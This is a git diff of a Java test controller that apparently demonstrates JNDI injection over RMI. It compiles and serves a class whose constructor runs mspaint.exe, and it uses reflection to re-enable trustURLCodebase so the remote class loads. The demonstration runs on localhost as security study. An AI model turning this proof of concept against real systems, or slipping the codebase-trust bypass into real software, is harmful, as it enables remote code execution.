@@ -53,7 +53,7 @@ public class JNDITestController {
         }
     }
 
-    private static void resetTrustURLCodebase(Boolean trustURLCodebase) throws Exception {
+    private static void resetRmiTrustURLCodebase(Boolean trustURLCodebase) throws Exception {
         Field[] fields = RegistryContext.class.getDeclaredFields();
         for (Field field: fields) {
             if(field.getName().equals("trustURLCodebase")){
@@ -64,8 +64,11 @@ public class JNDITestController {
                 field.setBoolean(null, trustURLCodebase);
             }
         }
+    }
+
+    private static void resetLdapTrustURLCodebase(Boolean trustURLCodebase) throws Exception {
         Class VersionHelper12 = Class.forName("com.sun.naming.internal.VersionHelper12");
-        fields = VersionHelper12.getDeclaredFields();
+        Field[] fields = VersionHelper12.getDeclaredFields();
         for (Field field: fields) {
             if(field.getName().equals("trustURLCodebase")){
                 field.setAccessible(true);
@@ -77,21 +80,30 @@ public class JNDITestController {
         }
     }
 
-    public static class AttackObject implements Serializable {
-        public AttackObject() throws Exception {
-            System.out.println("AttackObject");
-            Runtime.getRuntime().exec("mspaint.exe");
-        }
-    }
+    private static final String AttackObject =
+            "import java.io.Serializable;\n" +
+            "public class AttackObject implements Serializable {\n" +
+            "  public AttackObject() throws Exception {\n" +
+            "    System.out.println(\"AttackObject 构造方法被调用！\");\n" +
+            "    Runtime.getRuntime().exec(\"mspaint.exe\");\n" +
+            "  }\n" +
+            "}\n";
 
     @ApiIgnore
     @GetMapping(value = "AttackObject.class")
     public byte[] attackObject() throws Exception {
-        String classFile ="target/classes/cn/moonlord/test/JNDITestController$AttackObject.class";
+        String javaFile = "target/AttackObject.java";
+        FileOutputStream out = new FileOutputStream(new File(javaFile));
+        out.write(AttackObject.getBytes());
+        out.close();
+        Runtime.getRuntime().exec(new String[] { "javac", "-encoding", "UTF-8", javaFile });
+        String classFile ="target/AttackObject.class";
+        Thread.sleep(1000);
         FileInputStream in = new FileInputStream(new File(classFile));
         byte[] buffer = new byte[in.available()];
         in.read(buffer);
         in.close();
+        logger.info("attackObject return size : " + buffer.length);
         return buffer;
     }
 
@@ -102,7 +114,7 @@ public class JNDITestController {
         RemoteTask remoteTask = new RemoteTask();
         UnicastRemoteObject.exportObject(remoteTask, 0);
         LocalTask localTask = new LocalTask();
-        Reference attackObject = new Reference("AttackObject", null, "http://127.0.0.1:8090/JNDI/AttackObject.class");
+        Reference attackObject = new Reference("AttackObject", "AttackObject", "http://127.0.0.1:8080/JNDI/");
         ReferenceWrapper attackObjectWrapper = new ReferenceWrapper(attackObject);
         Registry registry = LocateRegistry.createRegistry(registryPort);
         logger.info("registry : " + registry);
@@ -181,7 +193,7 @@ public class JNDITestController {
         return task.execute(message).toString();
     }
 
-    @ApiOperation(value="测试用例 B1，启动 RMI 客户端，Context.lookup 获取远程 ReferenceWrapper 对象，高版本 JDK 会报错提示 untrusted")
+    @ApiOperation(value="测试用例 B1，启动 RMI 客户端，Context.lookup 获取远程 ReferenceWrapper 对象，新版本 JDK 会报错 The object factory is untrusted.")
     @GetMapping(value = "/TestB1")
     @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
     public String TestB1(@RequestParam Integer registryPort) throws Exception {
@@ -193,12 +205,13 @@ public class JNDITestController {
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
         Context ctx = new InitialContext();
-        resetTrustURLCodebase(false);
+        resetRmiTrustURLCodebase(false);
+        resetLdapTrustURLCodebase(false);
         Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
         return String.valueOf(object);
     }
 
-    @ApiOperation(value="测试用例 B2，在 B1 的基础上，设置 com.sun.jndi.rmi.object.trustURLCodebase 为 true，远程对象加载成功")
+    @ApiOperation(value="测试用例 B2，在 B1 的基础上，模拟旧版本，设置 com.sun.jndi.rmi.object.trustURLCodebase 为 true，无报错，但是对象不会构造")
     @GetMapping(value = "/TestB2")
     @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
     public String TestB2(@RequestParam Integer registryPort) throws Exception {
@@ -208,9 +221,28 @@ public class JNDITestController {
             logger.info("registry name : " + name);
         }
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
+        Context ctx = new InitialContext();
+        resetRmiTrustURLCodebase(true);
+        resetLdapTrustURLCodebase(false);
+        Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
+        return String.valueOf(object);
+    }
+
+    @ApiOperation(value="测试用例 B3，在 B2 的基础上，模拟旧版本，设置 com.sun.jndi.ldap.object.trustURLCodebase 为 true，对象成功构造")
+    @GetMapping(value = "/TestB3")
+    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
+    public String TestB3(@RequestParam Integer registryPort) throws Exception {
+        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
+        logger.info("registry : " + registry);
+        for(String name : registry.list()){
+            logger.info("registry name : " + name);
+        }
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
         Context ctx = new InitialContext();
-        resetTrustURLCodebase(true);
+        resetRmiTrustURLCodebase(true);
+        resetLdapTrustURLCodebase(true);
         Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
         return String.valueOf(object);
     }
